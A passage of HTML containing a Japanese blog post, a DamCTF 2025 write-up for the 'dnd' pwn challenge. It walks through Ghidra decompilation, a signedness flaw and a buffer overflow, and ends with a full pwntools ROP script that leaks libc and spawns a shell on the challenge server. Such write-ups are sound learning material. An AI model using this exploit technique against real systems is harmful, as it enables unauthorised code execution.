@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>Figaro&#x27;s Blog</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <meta name="robots" content="noodp"/>
+    <meta name="google-site-verification" content="g4e1f-rfOGwL8eft4txNmLdl2trU4nFIKvIdVoXx6V8" />
+
+    <link rel="stylesheet" href="https://figaro-san.github.io/style.css">
+    <link rel="stylesheet" href="https://figaro-san.github.io/color/green.css">
+
+        <link rel="stylesheet" href="https://figaro-san.github.io/color/background_dark.css">
+    
+    <link rel="stylesheet" href="https://figaro-san.github.io/font-hack-subset.css">
+
+    <meta name="description" content="">
+
+    <meta property="og:description" content="">
+    <meta property="og:title" content="Figaro's Blog">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://figaro-san.github.io/damctf-2025/">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:description" content="">
+    <meta name="twitter:title" content="Figaro's Blog">
+    <meta property="twitter:domain" content="figaro-san.github.io">
+    <meta property="twitter:url" content="https://figaro-san.github.io/damctf-2025/">
+
+        <link rel="shortcut icon" type="image&#x2F;x-icon" href="/butterfly.jpg">
+    
+    </head>
+
+<body class="">
+<div class="container">
+    
+    <header class="header">
+        <div class="header__inner">
+            <div class="header__logo">
+                    
+                <a href="https://figaro-san.github.io" style="text-decoration: none;">
+                    <div class="logo">
+                      
+                            Figaro&#x27;s Blog
+                        
+                    </div>
+                </a>
+            </div>
+        </div>
+
+        
+        
+                <nav class="menu">
+            <ul class="menu__inner">
+                <li class="active"><a href="https://figaro-san.github.io">blog</a></li>
+            
+                <li><a href="https://figaro-san.github.io/tags">tags</a></li>
+            
+                <li><a href="https://figaro-san.github.io/whoami">whoami</a></li>
+            
+                <li><a href="https://figaro-san.github.io/about">about</a></li>
+            
+                <li><a href="https://figaro-san.github.io/links">links</a></li>
+            </ul>
+        </nav>
+    
+    
+        
+    </header>
+    
+
+    <div class="content">
+        
+    <div class="post">
+        
+    <h1 class="post-title"><a href="https://figaro-san.github.io/damctf-2025/">DamCTF 2025 Writeup</a></h1>
+    <div class="post-meta-inline">
+        
+    <span class="post-date">
+            2025-05-17
+        </span>
+
+    </div>
+
+    
+        <span class="post-tags-inline">
+                :: tags:&nbsp;
+                <a class="post-tag" href="https://figaro-san.github.io/tags/ctf/">#CTF</a></span>
+    
+
+        <div class="post-content">
+            <h2 id="korehahe">これは何</h2>
+<p>DamCTF 2025のwriteup(1問のみ)です。writeupとは。<br />
+気づいたら2ヶ月近く何も更新していませんね。CTFをやればwriteupを書きたくなるのでこれは実質何もしていなかったことをバラしているようなものです。<br />
+実は他にも参加はしたんですが1問も解けず、結局何も書けないということもありました。</p>
+<hr />
+<h2 id="dnd">dnd</h2>
+<p>ソースコードが配れられいないのでGhidraで解析してみる<br />
+no pie で no canary なのでろぷ?って感じ<br />
+<code>win</code>関数があり、32bytesに対して<code>fgets(local_68,0x100,stdin);</code>なので自明なBOFが存在する<br />
+<code>win</code>にはたどり着けることも有るしたどり着けないこともある。何か抜け道は無いだろうか</p>
+<p>roundのための無限whileがあり、モンスターは<code>rand()%3</code>で計算されているのでどのモンスターが出るかはちょっと分からない。ゲーム終了(無限while終了)の処理と、その後の win or lose 処理が存在</p>
+<p>何やらソースコード全体で使われている変数があったので、その初期値設定を見てみる。</p>
+<pre data-lang="c++" style="background-color:#151515;color:#e8e8d3;" class="language-c++ "><code class="language-c++" data-lang="c++"><span style="color:#8fbfdc;">void</span><span> __thiscall Game::</span><span style="color:#fad07a;">Game</span><span>(Game *</span><span style="color:#ffb964;">this</span><span>)
+</span><span>
+</span><span>{
+</span><span>  *</span><span style="color:#ffb964;">this </span><span>= (Game)</span><span style="color:#cf6a4c;">0x0</span><span>;
+</span><span>  </span><span style="color:#ffb964;">this</span><span>[</span><span style="color:#cf6a4c;">1</span><span>] = (Game)</span><span style="color:#cf6a4c;">0xa</span><span>;
+</span><span>  </span><span style="color:#ffb964;">this</span><span>[</span><span style="color:#cf6a4c;">2</span><span>] = (Game)</span><span style="color:#cf6a4c;">0x5</span><span>;
+</span><span>  </span><span style="color:#8fbfdc;">return</span><span>;
+</span><span>}
+</span></code></pre>
+<pre data-lang="c++" style="background-color:#151515;color:#e8e8d3;" class="language-c++ "><code class="language-c++" data-lang="c++"><span style="color:#888888;">// 無限while終了
+</span><span style="color:#8fbfdc;">if </span><span>((round &lt; </span><span style="color:#cf6a4c;">5</span><span>) &amp;&amp; (cVar1 = Game::</span><span style="color:#ffb964;">IsOver</span><span>(important ?), cVar1 != </span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\x01</span><span style="color:#556633;">&#39;</span><span>)) {
+</span><span>  isOver = true;
+</span><span>}
+</span><span style="color:#8fbfdc;">else </span><span>{
+</span><span>  isOver = false;
+</span><span>}
+</span></code></pre>
+<pre data-lang="c++" style="background-color:#151515;color:#e8e8d3;" class="language-c++ "><code class="language-c++" data-lang="c++"><span>undefined8 Game::</span><span style="color:#fad07a;">IsOver</span><span>(</span><span style="color:#8fbfdc;">char </span><span>*</span><span style="color:#ffb964;">param_1</span><span>)
+</span><span>
+</span><span>{
+</span><span>  undefined8 uVar1;
+</span><span>
+</span><span>  </span><span style="color:#888888;">// while終了のためにはこちらが必要
+</span><span>  </span><span style="color:#8fbfdc;">if </span><span>((*param_1 &lt; </span><span style="color:#cf6a4c;">100</span><span>) &amp;&amp; (</span><span style="color:#cf6a4c;">0 </span><span>&lt; param_1[</span><span style="color:#cf6a4c;">1</span><span>])) {
+</span><span>    uVar1 = </span><span style="color:#cf6a4c;">0</span><span>;
+</span><span>  }
+</span><span>  </span><span style="color:#8fbfdc;">else </span><span>{
+</span><span>    uVar1 = </span><span style="color:#cf6a4c;">1</span><span>;
+</span><span>  }
+</span><span>  </span><span style="color:#8fbfdc;">return</span><span> uVar1;
+</span><span>}
+</span></code></pre>
+<p>重要そうな変数は下記と初期値が一致していた。便宜上<code>player_status</code>と名付ける。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>Points: 0 | Health: 10 | Attack: 5
+</span></code></pre>
+<p><code>player_status</code>の増減を追いたいのでAttackを見てみる<br />
+<code>*this</code>はモンスターの体力と思われ、<code>param_1[2]</code>はプレイヤーの攻撃力であり、体力&lt;攻撃力ならモンスターを撃破できる<br />
+その際</p>
+<ul>
+<li><code>*param_1</code>ことポイントがモンスターの体力+プレイヤーのポイントになる</li>
+<li><code>param_1[2]</code>こと攻撃力がインクリメントされる
+反対に負けると</li>
+<li>体力 = 体力 - モンスターの攻撃力</li>
+<li>ポイント = ポイント - モンスターの体力</li>
+</ul>
+<pre data-lang="c++" style="background-color:#151515;color:#e8e8d3;" class="language-c++ "><code class="language-c++" data-lang="c++"><span style="color:#8fbfdc;">void</span><span> __thiscall Monster::</span><span style="color:#fad07a;">Attack</span><span>(Monster *</span><span style="color:#ffb964;">this</span><span>,Game * </span><span style="color:#ffb964;">param_1</span><span>)
+</span><span>
+</span><span>{
+</span><span>  basic_ostream *pbVar1;
+</span><span>
+</span><span>  </span><span style="color:#888888;">// *thisはモンスターの体力と推察できる
+</span><span>  </span><span style="color:#888888;">// param_1[2]はプレイヤーのAttackなので 体力 &lt; 攻撃力 ならモンスターを倒せる
+</span><span>  </span><span style="color:#8fbfdc;">if </span><span>((</span><span style="color:#8fbfdc;">char</span><span>)*</span><span style="color:#ffb964;">this </span><span>&lt; (</span><span style="color:#8fbfdc;">char</span><span>)param_1[</span><span style="color:#cf6a4c;">2</span><span>]) {
+</span><span>    pbVar1 = std::</span><span style="color:#8fbfdc;">operator</span><span>&lt;&lt;((basic_ostream *)std::co ut,</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">You defeated the monster!</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>    std::basic_ostream&lt;&gt;::operator&lt;&lt;((basic_ostream &lt;&gt; *)pbVar1,std::endl&lt;&gt;);
+</span><span>    *param_1 = (Game)((</span><span style="color:#8fbfdc;">char</span><span>)*</span><span style="color:#ffb964;">this </span><span>+ (</span><span style="color:#8fbfdc;">char</span><span>)*param_1);
+</span><span>    param_1[</span><span style="color:#cf6a4c;">2</span><span>] = (Game)((</span><span style="color:#8fbfdc;">char</span><span>)param_1[</span><span style="color:#cf6a4c;">2</span><span>] + </span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\x01</span><span style="color:#556633;">&#39;</span><span>);
+</span><span>  }
+</span><span>  </span><span style="color:#8fbfdc;">else </span><span>{
+</span><span>    pbVar1 = std::</span><span style="color:#8fbfdc;">operator</span><span>&lt;&lt;((basic_ostream *)std::co ut,</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Oof, that hurt ;(</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>    std::basic_ostream&lt;&gt;::operator&lt;&lt;((basic_ostream &lt;&gt; *)pbVar1,std::endl&lt;&gt;);
+</span><span>    param_1[</span><span style="color:#cf6a4c;">1</span><span>] = (Game)((</span><span style="color:#8fbfdc;">char</span><span>)param_1[</span><span style="color:#cf6a4c;">1</span><span>] - (</span><span style="color:#8fbfdc;">char</span><span>)</span><span style="color:#ffb964;">this </span><span>[</span><span style="color:#cf6a4c;">1</span><span>]);
+</span><span>    *param_1 = (Game)((</span><span style="color:#8fbfdc;">char</span><span>)*param_1 - (</span><span style="color:#8fbfdc;">char</span><span>)*</span><span style="color:#ffb964;">this</span><span>);
+</span><span>  }
+</span><span>  </span><span style="color:#8fbfdc;">return</span><span>;
+</span><span>}
+</span></code></pre>
+<p>負けた場合</p>
+<ul>
+<li>Pointsが-9</li>
+<li>Healthも-9</li>
+</ul>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>&gt;&gt;&gt; Round 1
+</span><span>Points: 0 | Health: 10 | Attack: 5
+</span><span>New enemy! You are now facing off against: Tyrannus the Dragon (9 health, 9 damage)
+</span><span>Do you want to [a]ttack or [r]un? 
+</span><span>Oof, that hurt ;(
+</span><span>
+</span><span>&gt;&gt;&gt; Round 2
+</span><span>Points: -9 | Health: 1 | Attack: 5
+</span><span>New enemy! You are now facing off against: Glitchkin the Gremlin (1 health, 2 damage)
+</span><span>Do you want to [a]ttack or [r]un? 
+</span><span>You defeated the monster!
+</span></code></pre>
+<p>勝った場合</p>
+<ul>
+<li>Pointsが+2</li>
+<li>Attack++</li>
+</ul>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>&gt;&gt;&gt; Round 1
+</span><span>Points: 0 | Health: 10 | Attack: 5
+</span><span>New enemy! You are now facing off against: Glitchkin the Gremlin (2 health, 1 damage)
+</span><span>Do you want to [a]ttack or [r]un? a
+</span><span>You defeated the monster!
+</span><span>
+</span><span>&gt;&gt;&gt; Round 2
+</span><span>Points: 2 | Health: 10 | Attack: 6
+</span><span>New enemy! You are now facing off against: Glitchkin the Gremlin (1 health, 1 damage)
+</span><span>Do you want to [a]ttack or [r]un? a
+</span><span>You defeated the monster!
+</span></code></pre>
+<p>増減がどうなるか分かったのでもう一度while終了処理を見てみる<br />
+どうやら roundが0-4のうちにポイントが100未満かつ体力が1以上である必要があるらしい<br />
+とりあえず無限whileから抜け出すにはround5までに生き残れば良いらしい</p>
+<pre data-lang="c++" style="background-color:#151515;color:#e8e8d3;" class="language-c++ "><code class="language-c++" data-lang="c++"><span style="color:#8fbfdc;">while</span><span>( true ) {
+</span><span style="color:#8fbfdc;">if </span><span>((round &lt; </span><span style="color:#cf6a4c;">5</span><span>) &amp;&amp; (cVar1 = Game::</span><span style="color:#ffb964;">IsOver</span><span>(player_status), cVar1 != </span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\x01</span><span style="color:#556633;">&#39;</span><span>)) {
+</span><span>  game_continue = true;
+</span><span>}
+</span><span style="color:#8fbfdc;">else </span><span>{
+</span><span>  game_continue = false;
+</span><span>}
+</span><span style="color:#8fbfdc;">if </span><span>(!game_continue) </span><span style="color:#8fbfdc;">break</span><span>;
+</span></code></pre>
+<pre data-lang="c++" style="background-color:#151515;color:#e8e8d3;" class="language-c++ "><code class="language-c++" data-lang="c++"><span>undefined8 Game::</span><span style="color:#fad07a;">IsOver</span><span>(</span><span style="color:#8fbfdc;">char </span><span>*</span><span style="color:#ffb964;">param_1</span><span>)
+</span><span>
+</span><span>{
+</span><span>  undefined8 uVar1;
+</span><span>
+</span><span>  </span><span style="color:#888888;">// while終了のためにはこちらが必要
+</span><span>  </span><span style="color:#8fbfdc;">if </span><span>((*param_1 &lt; </span><span style="color:#cf6a4c;">100</span><span>) &amp;&amp; (</span><span style="color:#cf6a4c;">0 </span><span>&lt; param_1[</span><span style="color:#cf6a4c;">1</span><span>])) {
+</span><span>    uVar1 = </span><span style="color:#cf6a4c;">0</span><span>;
+</span><span>  }
+</span><span>  </span><span style="color:#8fbfdc;">else </span><span>{
+</span><span>    uVar1 = </span><span style="color:#cf6a4c;">1</span><span>;
+</span><span>  }
+</span><span>  </span><span style="color:#8fbfdc;">return</span><span> uVar1;
+</span><span>}
+</span></code></pre>
+<p>そしたら<code>DidWin()</code>関数による勝敗の処理を見てみる。pointsが100以上なら勝ちらしいが意味が分からない。<br />
+<code>*param_1</code>が符号なしで比較されるとしたらPointsが負数になると良いかもしれない -&gt; 負けてPointsをマイナスになるようにしてみると Healthが0以下になるかroundが5回終了するたびに<code>win</code>が実行された。<br />
+何故Pointsが負数になると比較処理で100以上と判定されるのかは未だに謎(おそらくunsignedなcharに負数を与えてifで比較するとcharがintに拡張されて正数になるから?)</p>
+<pre data-lang="c++" style="background-color:#151515;color:#e8e8d3;" class="language-c++ "><code class="language-c++" data-lang="c++"><span>cVar1 = Game::</span><span style="color:#ffb964;">DidWin</span><span>(player_status);
+</span><span style="color:#8fbfdc;">if </span><span>(cVar1 == </span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\0</span><span style="color:#556633;">&#39;</span><span>) {
+</span><span style="color:#ffb964;">lose</span><span>();
+</span><span>}
+</span><span style="color:#8fbfdc;">else </span><span>{
+</span><span style="color:#ffb964;">win</span><span>();
+</span><span>}
+</span></code></pre>
+<pre data-lang="c++" style="background-color:#151515;color:#e8e8d3;" class="language-c++ "><code class="language-c++" data-lang="c++"><span style="color:#8fbfdc;">bool </span><span>Game::</span><span style="color:#fad07a;">DidWin</span><span>(byte *</span><span style="color:#ffb964;">param_1</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style="color:#8fbfdc;">return </span><span style="color:#cf6a4c;">99 </span><span>&lt; *param_1;
+</span><span>}
+</span></code></pre>
+<p>なんやかんやで<code>win</code>の<code>fgets</code>まで行くスクリプトが書けたので、後はoffset等を求めていく。win関数のfgets終了直後の状態は以下の通り。<br />
+<code>0x41414141...</code>が入力したAの羅列である。<code>0x0000000000402c79</code>がmainへのretaddrなので、offsetは<code>8*13 = 104bytes</code>となる。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>0x7fffffffe0c0: 0x4141414141414141      0x00007fffffff000a
+</span><span>0x7fffffffe0d0: 0x00007fffffffe100      0x00007fffffffe150
+</span><span>0x7fffffffe0e0: 0x00007fffffffe120      0x0000000000403820
+</span><span>0x7fffffffe0f0: 0x0000000000000001      0x00007fffffffe150
+</span><span>0x7fffffffe100: 0x00007fffffffe120      0x00007fffffffe150
+</span><span>0x7fffffffe110: 0x00007fffffffe15d      0x0000000000000001
+</span><span>0x7fffffffe120: 0x00007fffffffe190      0x0000000000402c79
+</span></code></pre>
+<p>libcリークしたいのでputsを使ってputsのアドレスをリークしたい。<br />
+<code>dnd_pathced</code>の中には<code>pop rdi; ret</code>が無いため関数呼び出しができないことに気づく。libcを使いたいが、そのベースアドレスを求めるためにROPしているのであって本末転倒である。</p>
+<p>下記よりret2csuは使えない(glibc2.34以上が使えない)</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>[figaro@figaro-endeavour dnd]$ strings libc.so.6 | grep version
+</span><span>...
+</span><span>GNU C Library (Ubuntu GLIBC 2.39-0ubuntu8.4) stable release version 2.39.
+</span><span>...
+</span></code></pre>
+<p>pwntoolsは認識しないが、ROPgadgetしたら<code>pop rdi; nop; pop rbp; ret</code>を見つけたのでこれを使ってみる。<br />
+win関数の一回目で<code>puts(puts@got)</code>を行ってlibc baseをリークし、そのまま二回目のwin関数を実行させる。二回目のwin関数で<code>system("/bin/sh")</code>を行って終了。</p>
+<pre data-lang="python" style="background-color:#151515;color:#e8e8d3;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#8fbfdc;">from </span><span>pwn </span><span style="color:#8fbfdc;">import </span><span>*
+</span><span>
+</span><span>bin = </span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">./dnd_patched</span><span style="color:#556633;">&#39;
+</span><span>elf = context.binary = </span><span style="color:#ffb964;">ELF</span><span>(bin)
+</span><span>libc = </span><span style="color:#ffb964;">ELF</span><span>(</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">./libc.so.6</span><span style="color:#556633;">&#39;</span><span>)
+</span><span>
+</span><span style="color:#888888;">#p = process(bin)
+</span><span>p = </span><span style="color:#ffb964;">remote</span><span>(</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">dnd.chals.damctf.xyz</span><span style="color:#556633;">&#39;</span><span>, </span><span style="color:#cf6a4c;">30813</span><span>)
+</span><span>cnt = </span><span style="color:#cf6a4c;">1
+</span><span>
+</span><span style="color:#8fbfdc;">while </span><span>cnt &lt;= </span><span style="color:#cf6a4c;">5</span><span>:
+</span><span>    p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">Health: </span><span style="color:#556633;">&#39;</span><span>)
+</span><span>    current_health = </span><span style="color:#ffb964;">int</span><span>(p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#556633;">&#39; &#39;</span><span>), </span><span style="color:#cf6a4c;">10</span><span>)
+</span><span>
+</span><span>    p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">Attack: </span><span style="color:#556633;">&#39;</span><span>)
+</span><span>    current_attack = </span><span style="color:#ffb964;">int</span><span>(p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\n</span><span style="color:#556633;">&#39;</span><span>), </span><span style="color:#cf6a4c;">10</span><span>)
+</span><span>
+</span><span>    p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">(</span><span style="color:#556633;">&#39;</span><span>)
+</span><span>    monster_health = </span><span style="color:#ffb964;">int</span><span>(p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#556633;">&#39; &#39;</span><span>, </span><span style="color:#cf6a4c;">10</span><span>))
+</span><span>
+</span><span>    p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">, </span><span style="color:#556633;">&#39;</span><span>)
+</span><span>    monster_damage = </span><span style="color:#ffb964;">int</span><span>(p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#556633;">&#39; &#39;</span><span>, </span><span style="color:#cf6a4c;">10</span><span>))
+</span><span>
+</span><span>    </span><span style="color:#ffb964;">print</span><span>(</span><span style="color:#8fbfdc;">f</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">current_health: </span><span>{current_health}</span><span style="color:#556633;">&#39;</span><span>)
+</span><span>    </span><span style="color:#ffb964;">print</span><span>(</span><span style="color:#8fbfdc;">f</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">current_attack: </span><span>{current_attack}</span><span style="color:#556633;">&#39;</span><span>)
+</span><span>    </span><span style="color:#ffb964;">print</span><span>(</span><span style="color:#8fbfdc;">f</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">monster_health: </span><span>{monster_health}</span><span style="color:#556633;">&#39;</span><span>)
+</span><span>    </span><span style="color:#ffb964;">print</span><span>(</span><span style="color:#8fbfdc;">f</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">monster_damage: </span><span>{monster_damage}</span><span style="color:#556633;">&#39;</span><span>)
+</span><span>
+</span><span>
+</span><span>    p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">[r]un? </span><span style="color:#556633;">&#39;</span><span>)
+</span><span>    </span><span style="color:#8fbfdc;">if </span><span>(current_attack &lt;= monster_health):
+</span><span>        </span><span style="color:#ffb964;">print</span><span>(</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">send attack</span><span style="color:#556633;">&#39;</span><span>)
+</span><span>        p.</span><span style="color:#ffb964;">sendline</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">a</span><span style="color:#556633;">&#39;</span><span>)
+</span><span>    </span><span style="color:#8fbfdc;">else</span><span>:
+</span><span>        </span><span style="color:#ffb964;">print</span><span>(</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">send run</span><span style="color:#556633;">&#39;</span><span>)
+</span><span>        p.</span><span style="color:#ffb964;">sendline</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">r</span><span style="color:#556633;">&#39;</span><span>)
+</span><span>
+</span><span>    p.</span><span style="color:#ffb964;">recvline</span><span>()
+</span><span>    </span><span style="color:#8fbfdc;">if </span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">Congratulations</span><span style="color:#556633;">&#39; </span><span>in </span><span style="color:#8fbfdc;">f</span><span style="color:#556633;">&#39;</span><span>{p.</span><span style="color:#ffb964;">recvline</span><span>()}</span><span style="color:#556633;">&#39;</span><span>:
+</span><span>        </span><span style="color:#8fbfdc;">break
+</span><span>
+</span><span>    cnt+=</span><span style="color:#cf6a4c;">1
+</span><span>
+</span><span>
+</span><span style="color:#ffb964;">POP_RDI_NOP_POP_RBP_RET </span><span>= </span><span style="color:#cf6a4c;">0x0000000000402640
+</span><span style="color:#ffb964;">RET </span><span>= </span><span style="color:#cf6a4c;">0x000000000040201a
+</span><span>
+</span><span style="color:#888888;"># send ROP payload to execute puts(puts@got) to leak address of puts
+</span><span style="color:#888888;"># and execute win function again to send next payload
+</span><span>rop = </span><span style="color:#ffb964;">ROP</span><span>(elf)
+</span><span>rop.</span><span style="color:#ffb964;">raw</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">A</span><span style="color:#556633;">&#39;</span><span>*</span><span style="color:#cf6a4c;">104</span><span>)
+</span><span>rop.</span><span style="color:#ffb964;">raw</span><span>(</span><span style="color:#ffb964;">POP_RDI_NOP_POP_RBP_RET</span><span>)
+</span><span>rop.</span><span style="color:#ffb964;">raw</span><span>(elf.got[</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">puts</span><span style="color:#556633;">&#39;</span><span>])
+</span><span>rop.</span><span style="color:#ffb964;">raw</span><span>(</span><span style="color:#cf6a4c;">0x0</span><span>)
+</span><span>rop.</span><span style="color:#ffb964;">raw</span><span>(elf.plt[</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">puts</span><span style="color:#556633;">&#39;</span><span>])
+</span><span>rop.</span><span style="color:#ffb964;">raw</span><span>(elf.sym[</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">_Z3winv</span><span style="color:#556633;">&#39;</span><span>])
+</span><span style="color:#ffb964;">print</span><span>(rop.</span><span style="color:#ffb964;">dump</span><span>())
+</span><span>payload = rop.</span><span style="color:#ffb964;">chain</span><span>()
+</span><span>p.</span><span style="color:#ffb964;">sendline</span><span>(payload)
+</span><span>
+</span><span style="color:#888888;"># calculate libc base
+</span><span>p.</span><span style="color:#ffb964;">recvline</span><span>()
+</span><span>puts_addr = </span><span style="color:#ffb964;">u64</span><span>(p.</span><span style="color:#ffb964;">recv</span><span>(</span><span style="color:#cf6a4c;">6</span><span>).</span><span style="color:#ffb964;">ljust</span><span>(</span><span style="color:#cf6a4c;">8</span><span>, </span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\x00</span><span style="color:#556633;">&#39;</span><span>))
+</span><span style="color:#ffb964;">print</span><span>(</span><span style="color:#ffb964;">hex</span><span>(puts_addr))
+</span><span>libc.address = puts_addr - libc.sym[</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">puts</span><span style="color:#556633;">&#39;</span><span>]
+</span><span style="color:#ffb964;">print</span><span>(</span><span style="color:#ffb964;">hex</span><span>(libc.address))
+</span><span>
+</span><span style="color:#888888;"># send system(&quot;/bin/sh&quot;)
+</span><span>p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">warrior? </span><span style="color:#556633;">&#39;</span><span>)
+</span><span>rop = </span><span style="color:#ffb964;">ROP</span><span>(libc)
+</span><span>rop.</span><span style="color:#ffb964;">raw</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">A</span><span style="color:#556633;">&#39;</span><span>*</span><span style="color:#cf6a4c;">104</span><span>)
+</span><span>rop.</span><span style="color:#ffb964;">raw</span><span>(</span><span style="color:#ffb964;">RET</span><span>)
+</span><span>rop.</span><span style="color:#ffb964;">raw</span><span>(</span><span style="color:#ffb964;">POP_RDI_NOP_POP_RBP_RET</span><span>)
+</span><span>rop.</span><span style="color:#ffb964;">raw</span><span>(</span><span style="color:#ffb964;">next</span><span>(libc.</span><span style="color:#ffb964;">search</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">/bin/sh</span><span style="color:#556633;">&#39;</span><span>)))
+</span><span>rop.</span><span style="color:#ffb964;">raw</span><span>(</span><span style="color:#cf6a4c;">0x0</span><span>)
+</span><span>rop.</span><span style="color:#ffb964;">raw</span><span>(libc.sym[</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">system</span><span style="color:#556633;">&#39;</span><span>])
+</span><span style="color:#ffb964;">print</span><span>(rop.</span><span style="color:#ffb964;">dump</span><span>())
+</span><span>payload = rop.</span><span style="color:#ffb964;">chain</span><span>()
+</span><span>
+</span><span>p.</span><span style="color:#ffb964;">sendline</span><span>(payload)
+</span><span>
+</span><span>p.</span><span style="color:#ffb964;">interactive</span><span>()
+</span></code></pre>
+<p>フラグ
+<code>dam{w0w_th0s3_sc4ry_m0nster5_are_w3ak}</code></p>
+<hr />
+<h2 id="zhong-warini">終わりに</h2>
+<p>他は解いていないんですか!? -&gt; はい</p>
+
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h">Thanks for reading! Read other posts?</span>
+                    <hr />
+                </div>
+                <div class="pagination__buttons">
+                        <span class="button previous">
+                            <a href="https://figaro-san.github.io/home-network/">
+                                <span class="button__icon">←</span>&nbsp;
+                                <span class="button__text">私のおうちネットワーク環境</span>
+                            </a>
+                        </span>
+                    
+                    
+                        <span class="button next">
+                            <a href="https://figaro-san.github.io/gpn-ctf-2025/">
+                                <span class="button__text">GPN CTF 2025 Writeup</span>&nbsp;
+                                <span class="button__icon">→</span>
+                            </a>
+                        </span>
+                    </div>
+            </div>
+        
+    </div>
+
+    </div>
+
+    
+    <footer class="footer">
+        <div class="footer__inner">
+                <div class="copyright">
+                        <span>© 
+    2025
+ Powered by <a href="https://www.getzola.org/">Zola</a></span>
+                    <span class="copyright-theme">
+                        <span class="copyright-theme-sep">:: </span>
+                        Theme: <a href="https://github.com/pawroman/zola-theme-terminimal/">Terminimal</a> by pawroman
+                    </span>
+                </div>
+            </div>
+    </footer>
+    
+
+</div>
+</body>
+
+</html>
